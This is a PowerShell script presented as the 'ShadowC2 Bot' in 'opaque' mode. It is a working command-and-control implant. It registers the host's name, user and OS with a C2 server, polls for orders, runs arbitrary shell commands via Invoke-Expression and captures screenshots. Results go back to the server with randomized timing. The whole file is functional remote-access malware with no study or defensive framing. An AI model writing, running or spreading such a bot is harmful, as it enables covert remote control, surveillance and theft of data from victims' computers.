# ShadowC2 Bot - Modo OPACO
$C2_IP = "192.168.1.6"
$C2_PORT = "8000"
$BOT_ID = -join ((48..57) + (97..102) | Get-Random -Count 16 | ForEach-Object {[char]$_})

function Register-Bot {
    $body = @{
        bot_id = $BOT_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
        capabilities = @("shell","screenshot","info","persist","download")
    } | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/stealth/register" -Method POST -Body $body -ContentType "application/json"
        return $true
    } catch { return $false }
}

function Check-Commands {
    try {
        $resp = Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/stealth/check/$BOT_ID" -Method GET
        return $resp.commands
    } catch { return @() }
}

function Send-Result($cmdId, $result) {
    $body = @{ cmd_id = $cmdId; result = $result } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/stealth/result/$BOT_ID" -Method POST -Body $body -ContentType "application/json"
    } catch {}
}

function Execute-Shell($cmd) {
    try { $out = Invoke-Expression $cmd 2>&1 | Out-String; return $out }
    catch { return $_.Exception.Message }
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        return [Convert]::ToBase64String($ms.ToArray())
    } catch { return "Error: $_" }
}

# MAIN
if (Register-Bot) {
    while ($true) {
        $commands = Check-Commands
        foreach ($cmd in $commands) {
            $result = switch ($cmd.command) {
                "shell" { Execute-Shell ($cmd.args) }
                "screenshot" { Take-Screenshot }
                "info" { @{hostname=$env:COMPUTERNAME; username=$env:USERNAME; os=(Get-CimInstance Win32_OperatingSystem).Caption} | ConvertTo-Json }
                "kill" { exit }
                default { "Unknown" }
            }
            Send-Result $cmd.id $result
        }
        Start-Sleep -Seconds (10..15 | Get-Random)
    }
}
